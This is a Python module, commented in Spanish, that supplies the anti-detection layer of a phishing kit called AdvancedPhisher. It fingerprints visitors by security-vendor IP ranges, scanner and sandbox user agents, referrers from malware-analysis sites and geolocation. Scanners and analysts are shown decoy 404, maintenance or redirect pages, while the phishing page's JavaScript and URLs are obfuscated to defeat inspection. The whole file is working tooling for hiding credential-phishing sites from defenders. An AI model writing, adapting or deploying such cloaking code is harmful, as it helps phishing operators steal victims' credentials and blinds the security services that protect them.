#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sistema de Evasión y Anti-Detección para AdvancedPhisher
Implementa técnicas avanzadas para evitar detección por sistemas de seguridad
"""

import os
import re
import json
import time
import random
import string
import hashlib
import base64
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs
import requests
from user_agents import parse as parse_user_agent
from collections import defaultdict
import ipaddress
from cryptography.fernet import Fernet

@dataclass
class EvasionConfig:
    """Configuración de técnicas de evasión"""
    enable_user_agent_rotation: bool = True
    enable_ip_filtering: bool = True
    enable_geolocation_filtering: bool = True
    enable_referrer_checking: bool = True
    enable_timing_analysis: bool = True
    enable_honeypot_detection: bool = True
    enable_sandbox_detection: bool = True
    enable_content_obfuscation: bool = True
    enable_dynamic_urls: bool = True
    enable_cloaking: bool = True
    max_requests_per_ip: int = 5
    time_window_minutes: int = 60
    blocked_countries: List[str] = None
    allowed_countries: List[str] = None
    suspicious_user_agents: List[str] = None
    
class EvasionManager:
    """Gestor de técnicas de evasión y anti-detección"""
    
    def __init__(self, config: EvasionConfig = None):
        self.config = config or EvasionConfig()
        self.request_tracker = defaultdict(list)
        self.blocked_ips = set()
        self.suspicious_patterns = self._load_suspicious_patterns()
        self.legitimate_user_agents = self._load_legitimate_user_agents()
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        
        # Cargar listas de IPs y dominios sospechosos
        self.security_vendor_ips = self._load_security_vendor_ips()
        self.sandbox_indicators = self._load_sandbox_indicators()
        
    def _load_suspicious_patterns(self) -> Dict[str, List[str]]:
        """Cargar patrones sospechosos conocidos"""
        return {
            'security_tools': [
                'nmap', 'nikto', 'sqlmap', 'burp', 'owasp', 'zap', 'w3af',
                'metasploit', 'nessus', 'openvas', 'acunetix', 'qualys'
            ],
            'automated_browsers': [
                'headless', 'phantom', 'selenium', 'webdriver', 'automation',
                'bot', 'crawler', 'spider', 'scraper', 'monitor'
            ],
            'analysis_tools': [
                'wireshark', 'fiddler', 'charles', 'mitmproxy', 'tcpdump',
                'ettercap', 'aircrack', 'hashcat', 'john'
            ],
            'sandbox_indicators': [
                'vmware', 'virtualbox', 'qemu', 'xen', 'hyper-v',
                'sandbox', 'analysis', 'malware', 'virus', 'threat'
            ]
        }
    
    def _load_legitimate_user_agents(self) -> List[str]:
        """Cargar lista de User Agents legítimos"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
            'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        ]
    
    def _load_security_vendor_ips(self) -> List[str]:
        """Cargar rangos de IPs de proveedores de seguridad conocidos"""
        # Rangos de IPs conocidos de proveedores de seguridad
        return [
            # Cloudflare
            '173.245.48.0/20', '103.21.244.0/22', '103.22.200.0/22',
            '103.31.4.0/22', '141.101.64.0/18', '108.162.192.0/18',
            # Google
            '8.8.8.0/24', '8.8.4.0/24', '64.233.160.0/19',
            # Microsoft
            '40.76.0.0/14', '40.112.0.0/13', '52.96.0.0/14',
            # Amazon AWS
            '52.95.0.0/16', '54.239.0.0/16', '52.119.0.0/16'
        ]
    
    def _load_sandbox_indicators(self) -> Dict[str, List[str]]:
        """Cargar indicadores de entornos sandbox"""
        return {
            'vm_artifacts': [
                'vmware', 'virtualbox', 'vbox', 'qemu', 'xen', 'hyper-v',
                'parallels', 'bochs', 'sandboxie', 'wine'
            ],
            'analysis_domains': [
                'virustotal.com', 'hybrid-analysis.com', 'malwr.com',
                'anubis.iseclab.org', 'joesandbox.com', 'cuckoosandbox.org'
            ],
            'security_companies': [
                'symantec', 'mcafee', 'kaspersky', 'avast', 'avg', 'bitdefender',
                'eset', 'f-secure', 'trend', 'sophos', 'malwarebytes'
            ]
        }
    
    def analyze_request(self, request_data: Dict[str, Any]) -> Dict[str, Any]:
        """Analizar solicitud entrante para detectar amenazas"""
        analysis_result = {
            'allowed': True,
            'risk_score': 0,
            'reasons': [],
            'recommendations': [],
            'fingerprint': self._generate_request_fingerprint(request_data)
        }
        
        try:
            # Análisis de IP
            ip_analysis = self._analyze_ip(request_data.get('ip', ''))
            analysis_result['risk_score'] += ip_analysis['risk_score']
            analysis_result['reasons'].extend(ip_analysis['reasons'])
            
            # Análisis de User Agent
            ua_analysis = self._analyze_user_agent(request_data.get('user_agent', ''))
            analysis_result['risk_score'] += ua_analysis['risk_score']
            analysis_result['reasons'].extend(ua_analysis['reasons'])
            
            # Análisis de referrer
            ref_analysis = self._analyze_referrer(request_data.get('referrer', ''))
            analysis_result['risk_score'] += ref_analysis['risk_score']
            analysis_result['reasons'].extend(ref_analysis['reasons'])
            
            # Análisis temporal
            timing_analysis = self._analyze_timing_patterns(request_data.get('ip', ''))
            analysis_result['risk_score'] += timing_analysis['risk_score']
            analysis_result['reasons'].extend(timing_analysis['reasons'])
            
            # Análisis de geolocalización
            geo_analysis = self._analyze_geolocation(request_data.get('geo_info', {}))
            analysis_result['risk_score'] += geo_analysis['risk_score']
            analysis_result['reasons'].extend(geo_analysis['reasons'])
            
            # Detección de sandbox
            sandbox_analysis = self._detect_sandbox_environment(request_data)
            analysis_result['risk_score'] += sandbox_analysis['risk_score']
            analysis_result['reasons'].extend(sandbox_analysis['reasons'])
            
            # Determinar si bloquear la solicitud
            if analysis_result['risk_score'] >= 50:
                analysis_result['allowed'] = False
                analysis_result['recommendations'].append('Bloquear solicitud')
            elif analysis_result['risk_score'] >= 30:
                analysis_result['recommendations'].append('Monitorear de cerca')
                analysis_result['recommendations'].append('Aplicar cloaking')
            
            return analysis_result
            
        except Exception as e:
            return {
                'allowed': False,
                'risk_score': 100,
                'reasons': [f'Error en análisis: {str(e)}'],
                'recommendations': ['Bloquear por seguridad']
            }
    
    def _analyze_ip(self, ip: str) -> Dict[str, Any]:
        """Analizar dirección IP"""
        result = {'risk_score': 0, 'reasons': []}
        
        if not ip or ip == 'unknown':
            result['risk_score'] += 20
            result['reasons'].append('IP desconocida o no proporcionada')
            return result
        
        try:
            ip_obj = ipaddress.ip_address(ip)
            
            # Verificar si es IP privada
            if ip_obj.is_private:
                result['risk_score'] += 30
                result['reasons'].append('IP privada detectada')
            
            # Verificar si es IP de loopback
            if ip_obj.is_loopback:
                result['risk_score'] += 40
                result['reasons'].append('IP de loopback detectada')
            
            # Verificar rangos de proveedores de seguridad
            for cidr in self.security_vendor_ips:
                if ip_obj in ipaddress.ip_network(cidr, strict=False):
                    result['risk_score'] += 60
                    result['reasons'].append('IP de proveedor de seguridad detectada')
                    break
            
            # Verificar si la IP está en la lista de bloqueados
            if ip in self.blocked_ips:
                result['risk_score'] += 80
                result['reasons'].append('IP previamente bloqueada')
            
            # Verificar patrones de solicitudes
            recent_requests = self.request_tracker.get(ip, [])
            if len(recent_requests) > self.config.max_requests_per_ip:
                result['risk_score'] += 40
                result['reasons'].append('Demasiadas solicitudes desde esta IP')
            
        except ValueError:
            result['risk_score'] += 50
            result['reasons'].append('Formato de IP inválido')
        
        return result
    
    def _analyze_user_agent(self, user_agent: str) -> Dict[str, Any]:
        """Analizar User Agent"""
        result = {'risk_score': 0, 'reasons': []}
        
        if not user_agent:
            result['risk_score'] += 30
            result['reasons'].append('User Agent vacío')
            return result
        
        ua_lower = user_agent.lower()
        
        # Verificar patrones sospechosos
        for category, patterns in self.suspicious_patterns.items():
            for pattern in patterns:
                if pattern in ua_lower:
                    result['risk_score'] += 40
                    result['reasons'].append(f'Patrón sospechoso detectado: {pattern} ({category})')
        
        # Verificar si es un User Agent muy común (posible bot)
        common_bots = ['bot', 'crawler', 'spider', 'scraper']
        for bot_pattern in common_bots:
            if bot_pattern in ua_lower:
                result['risk_score'] += 35
                result['reasons'].append(f'Bot detectado: {bot_pattern}')
        
        # Analizar estructura del User Agent
        try:
            parsed_ua = parse_user_agent(user_agent)
            
            # Verificar versiones muy antiguas
            if parsed_ua.browser.family and parsed_ua.browser.version:
                version = parsed_ua.browser.version[0] if parsed_ua.browser.version else 0
                if parsed_ua.browser.family.lower() == 'chrome' and version < 100:
                    result['risk_score'] += 20
                    result['reasons'].append('Versión de navegador muy antigua')
                elif parsed_ua.browser.family.lower() == 'firefox' and version < 100:
                    result['risk_score'] += 20
                    result['reasons'].append('Versión de navegador muy antigua')
            
            # Verificar inconsistencias
            if not parsed_ua.os.family or not parsed_ua.browser.family:
                result['risk_score'] += 25
                result['reasons'].append('User Agent malformado o incompleto')
                
        except Exception:
            result['risk_score'] += 30
            result['reasons'].append('Error analizando User Agent')
        
        return result
    
    def _analyze_referrer(self, referrer: str) -> Dict[str, Any]:
        """Analizar referrer"""
        result = {'risk_score': 0, 'reasons': []}
        
        if not referrer or referrer == 'unknown':
            result['risk_score'] += 10
            result['reasons'].append('Sin referrer')
            return result
        
        try:
            parsed_url = urlparse(referrer)
            domain = parsed_url.netloc.lower()
            
            # Verificar dominios de análisis conocidos
            for analysis_domain in self.sandbox_indicators['analysis_domains']:
                if analysis_domain in domain:
                    result['risk_score'] += 70
                    result['reasons'].append(f'Referrer de dominio de análisis: {analysis_domain}')
            
            # Verificar dominios de empresas de seguridad
            for security_company in self.sandbox_indicators['security_companies']:
                if security_company in domain:
                    result['risk_score'] += 60
                    result['reasons'].append(f'Referrer de empresa de seguridad: {security_company}')
            
            # Verificar patrones sospechosos en la URL
            suspicious_params = ['test', 'scan', 'probe', 'check', 'analyze']
            query_params = parse_qs(parsed_url.query)
            for param in suspicious_params:
                if any(param in str(v).lower() for v in query_params.values()):
                    result['risk_score'] += 25
                    result['reasons'].append(f'Parámetro sospechoso en referrer: {param}')
            
        except Exception:
            result['risk_score'] += 15
            result['reasons'].append('Error analizando referrer')
        
        return result
    
    def _analyze_timing_patterns(self, ip: str) -> Dict[str, Any]:
        """Analizar patrones temporales de solicitudes"""
        result = {'risk_score': 0, 'reasons': []}
        
        if not ip:
            return result
        
        current_time = datetime.now()
        
        # Registrar solicitud actual
        self.request_tracker[ip].append(current_time)
        
        # Limpiar solicitudes antiguas
        cutoff_time = current_time - timedelta(minutes=self.config.time_window_minutes)
        self.request_tracker[ip] = [
            req_time for req_time in self.request_tracker[ip] 
            if req_time > cutoff_time
        ]
        
        recent_requests = self.request_tracker[ip]
        
        # Analizar frecuencia de solicitudes
        if len(recent_requests) > self.config.max_requests_per_ip:
            result['risk_score'] += 50
            result['reasons'].append(f'Demasiadas solicitudes: {len(recent_requests)} en {self.config.time_window_minutes} minutos')
        
        # Analizar intervalos entre solicitudes
        if len(recent_requests) >= 3:
            intervals = []
            for i in range(1, len(recent_requests)):
                interval = (recent_requests[i] - recent_requests[i-1]).total_seconds()
                intervals.append(interval)
            
            # Detectar patrones automatizados (intervalos muy regulares)
            if len(set(int(i) for i in intervals)) == 1 and len(intervals) >= 3:
                result['risk_score'] += 40
                result['reasons'].append('Patrón de solicitudes automatizado detectado')
            
            # Detectar solicitudes muy rápidas
            if any(interval < 1 for interval in intervals):
                result['risk_score'] += 35
                result['reasons'].append('Solicitudes demasiado rápidas (< 1 segundo)')
        
        return result
    
    def _analyze_geolocation(self, geo_info: Dict[str, Any]) -> Dict[str, Any]:
        """Analizar información de geolocalización"""
        result = {'risk_score': 0, 'reasons': []}
        
        if not geo_info:
            return result
        
        country = geo_info.get('country', '').upper()
        
        # Verificar países bloqueados
        if self.config.blocked_countries and country in self.config.blocked_countries:
            result['risk_score'] += 80
            result['reasons'].append(f'País bloqueado: {country}')
        
        # Verificar países permitidos
        if self.config.allowed_countries and country not in self.config.allowed_countries:
            result['risk_score'] += 60
            result['reasons'].append(f'País no permitido: {country}')
        
        # Verificar países con alta actividad de análisis de malware
        high_risk_countries = ['US', 'NL', 'DE', 'GB', 'FR']  # Países con muchos servicios de análisis
        if country in high_risk_countries:
            result['risk_score'] += 20
            result['reasons'].append(f'País de alto riesgo para análisis: {country}')
        
        return result
    
    def _detect_sandbox_environment(self, request_data: Dict[str, Any]) -> Dict[str, Any]:
        """Detectar entornos sandbox"""
        result = {'risk_score': 0, 'reasons': []}
        
        user_agent = request_data.get('user_agent', '').lower()
        headers = request_data.get('headers', {})
        
        # Verificar artefactos de VM en User Agent
        for vm_artifact in self.sandbox_indicators['vm_artifacts']:
            if vm_artifact in user_agent:
                result['risk_score'] += 60
                result['reasons'].append(f'Artefacto de VM detectado: {vm_artifact}')
        
        # Verificar headers sospechosos
        suspicious_headers = {
            'x-forwarded-for': 'Proxy detectado',
            'x-real-ip': 'Proxy detectado',
            'x-originating-ip': 'Proxy detectado'
        }
        
        for header, description in suspicious_headers.items():
            if header in [h.lower() for h in headers.keys()]:
                result['risk_score'] += 25
                result['reasons'].append(description)
        
        # Verificar ausencia de headers comunes
        common_headers = ['accept', 'accept-language', 'accept-encoding']
        missing_headers = [h for h in common_headers if h not in [h.lower() for h in headers.keys()]]
        
        if len(missing_headers) >= 2:
            result['risk_score'] += 30
            result['reasons'].append(f'Headers comunes faltantes: {missing_headers}')
        
        return result
    
    def _generate_request_fingerprint(self, request_data: Dict[str, Any]) -> str:
        """Generar huella digital de la solicitud"""
        fingerprint_data = {
            'ip': request_data.get('ip', ''),
            'user_agent': request_data.get('user_agent', ''),
            'accept_language': request_data.get('headers', {}).get('Accept-Language', ''),
            'accept_encoding': request_data.get('headers', {}).get('Accept-Encoding', '')
        }
        
        fingerprint_string = json.dumps(fingerprint_data, sort_keys=True)
        return hashlib.sha256(fingerprint_string.encode()).hexdigest()[:16]
    
    def generate_cloaked_content(self, original_content: str, request_analysis: Dict[str, Any]) -> str:
        """Generar contenido camuflado basado en el análisis de la solicitud"""
        if request_analysis['risk_score'] < 30:
            return original_content
        
        # Contenido de camuflaje para solicitudes sospechosas
        cloaked_templates = [
            self._generate_404_page(),
            self._generate_maintenance_page(),
            self._generate_redirect_page(),
            self._generate_generic_landing_page()
        ]
        
        # Seleccionar template basado en el nivel de riesgo
        if request_analysis['risk_score'] >= 70:
            return cloaked_templates[0]  # 404
        elif request_analysis['risk_score'] >= 50:
            return cloaked_templates[1]  # Mantenimiento
        elif request_analysis['risk_score'] >= 40:
            return cloaked_templates[2]  # Redirect
        else:
            return cloaked_templates[3]  # Landing genérico
    
    def _generate_404_page(self) -> str:
        """Generar página 404 convincente"""
        return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 - Page Not Found</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        h1 { color: #333; }
        p { color: #666; }
    </style>
</head>
<body>
    <h1>404 - Page Not Found</h1>
    <p>The page you are looking for might have been removed, had its name changed, or is temporarily unavailable.</p>
    <p><a href="/">Go back to homepage</a></p>
</body>
</html>
        '''
    
    def _generate_maintenance_page(self) -> str:
        """Generar página de mantenimiento"""
        return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Maintenance</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f5f5; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 10px; }
        h1 { color: #333; }
        p { color: #666; line-height: 1.6; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔧 Site Under Maintenance</h1>
        <p>We're currently performing scheduled maintenance to improve your experience.</p>
        <p>Please check back in a few hours. Thank you for your patience!</p>
    </div>
</body>
</html>
        '''
    
    def _generate_redirect_page(self) -> str:
        """Generar página de redirección"""
        legitimate_sites = [
            'https://www.google.com',
            'https://www.microsoft.com',
            'https://www.github.com',
            'https://www.stackoverflow.com'
        ]
        
        redirect_url = random.choice(legitimate_sites)
        
        return f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <meta http-equiv="refresh" content="3;url={redirect_url}">
    <style>
        body {{ font-family: Arial, sans-serif; text-align: center; padding: 50px; }}
        .spinner {{ border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <h2>Redirecting...</h2>
    <div class="spinner"></div>
    <p>If you are not redirected automatically, <a href="{redirect_url}">click here</a>.</p>
</body>
</html>
        '''
    
    def _generate_generic_landing_page(self) -> str:
        """Generar página de aterrizaje genérica"""
        return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
        .container { max-width: 800px; margin: 0 auto; padding: 100px 20px; text-align: center; }
        h1 { font-size: 3em; margin-bottom: 20px; }
        p { font-size: 1.2em; margin-bottom: 30px; }
        .btn { display: inline-block; padding: 15px 30px; background: rgba(255,255,255,0.2); color: white; text-decoration: none; border-radius: 5px; transition: all 0.3s; }
        .btn:hover { background: rgba(255,255,255,0.3); }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome</h1>
        <p>This site is currently being developed. Please check back soon for updates.</p>
        <a href="#" class="btn">Learn More</a>
    </div>
</body>
</html>
        '''
    
    def obfuscate_content(self, content: str) -> str:
        """Ofuscar contenido para evitar detección"""
        if not self.config.enable_content_obfuscation:
            return content
        
        try:
            # Ofuscación básica de JavaScript
            content = self._obfuscate_javascript(content)
            
            # Ofuscación de URLs
            content = self._obfuscate_urls(content)
            
            # Añadir ruido aleatorio
            content = self._add_noise_comments(content)
            
            return content
            
        except Exception as e:
            print(f"Error en ofuscación: {e}")
            return content
    
    def _obfuscate_javascript(self, content: str) -> str:
        """Ofuscar código JavaScript"""
        # Reemplazar nombres de variables comunes
        js_replacements = {
            'document': f'_{self._random_string(8)}',
            'window': f'_{self._random_string(8)}',
            'location': f'_{self._random_string(8)}',
            'submit': f'_{self._random_string(8)}',
            'form': f'_{self._random_string(8)}'
        }
        
        for original, obfuscated in js_replacements.items():
            # Solo reemplazar en contexto JavaScript
            content = re.sub(
                rf'\b{original}\b(?=[^<]*(?:<script|$))',
                obfuscated,
                content,
                flags=re.IGNORECASE
            )
        
        return content
    
    def _obfuscate_urls(self, content: str) -> str:
        """Ofuscar URLs en el contenido"""
        # Convertir URLs a formato base64 o hex
        url_pattern = r'(https?://[^\s<>"\'\']+)'
        
        def encode_url(match):
            url = match.group(1)
            encoded = base64.b64encode(url.encode()).decode()
            return f'atob("{encoded}")'
        
        return re.sub(url_pattern, encode_url, content)
    
    def _add_noise_comments(self, content: str) -> str:
        """Añadir comentarios de ruido para confundir análisis"""
        noise_comments = [
            '<!-- Analytics tracking -->',
            '<!-- SEO optimization -->',
            '<!-- Performance monitoring -->',
            '<!-- User experience enhancement -->',
            '<!-- Security headers -->',
            '<!-- Cache optimization -->'
        ]
        
        # Insertar comentarios aleatorios
        for _ in range(random.randint(3, 7)):
            comment = random.choice(noise_comments)
            insert_pos = random.randint(0, len(content))
            content = content[:insert_pos] + comment + content[insert_pos:]
        
        return content
    
    def _random_string(self, length: int) -> str:
        """Generar string aleatorio"""
        return ''.join(random.choices(string.ascii_letters, k=length))
    
    def generate_dynamic_url(self, base_url: str) -> str:
        """Generar URL dinámica para evitar detección"""
        if not self.config.enable_dynamic_urls:
            return base_url
        
        # Añadir parámetros aleatorios
        random_params = {
            'ref': self._random_string(8),
            'utm_source': random.choice(['google', 'facebook', 'twitter', 'linkedin']),
            'utm_medium': random.choice(['social', 'email', 'cpc', 'organic']),
            'v': str(random.randint(1, 999))
        }
        
        param_string = '&'.join([f'{k}={v}' for k, v in random_params.items()])
        separator = '&' if '?' in base_url else '?'
        
        return f'{base_url}{separator}{param_string}'
    
    def get_evasion_stats(self) -> Dict[str, Any]:
        """Obtener estadísticas de evasión"""
        total_requests = sum(len(requests) for requests in self.request_tracker.values())
        
        return {
            'total_requests_tracked': total_requests,
            'unique_ips': len(self.request_tracker),
            'blocked_ips': len(self.blocked_ips),
            'active_ips': len([ip for ip, requests in self.request_tracker.items() if requests]),
            'config': {
                'max_requests_per_ip': self.config.max_requests_per_ip,
                'time_window_minutes': self.config.time_window_minutes,
                'evasion_techniques_enabled': {
                    'user_agent_rotation': self.config.enable_user_agent_rotation,
                    'ip_filtering': self.config.enable_ip_filtering,
                    'geolocation_filtering': self.config.enable_geolocation_filtering,
                    'content_obfuscation': self.config.enable_content_obfuscation,
                    'cloaking': self.config.enable_cloaking
                }
            }
        }
    
    def block_ip(self, ip: str, reason: str = ""):
        """Bloquear IP específica"""
        self.blocked_ips.add(ip)
        print(f"IP {ip} bloqueada. Razón: {reason}")
    
    def unblock_ip(self, ip: str):
        """Desbloquear IP específica"""
        self.blocked_ips.discard(ip)
        print(f"IP {ip} desbloqueada")
    
    def clear_tracking_data(self):
        """Limpiar datos de seguimiento"""
        self.request_tracker.clear()
        print("Datos de seguimiento limpiados")

# Función de conveniencia para análisis rápido
def quick_analyze_request(ip: str, user_agent: str, referrer: str = "", 
                         geo_info: Dict[str, Any] = None) -> Dict[str, Any]:
    """Función de conveniencia para análisis rápido de solicitudes"""
    evasion_manager = EvasionManager()
    
    request_data = {
        'ip': ip,
        'user_agent': user_agent,
        'referrer': referrer,
        'geo_info': geo_info or {},
        'headers': {}
    }
    
    return evasion_manager.analyze_request(request_data)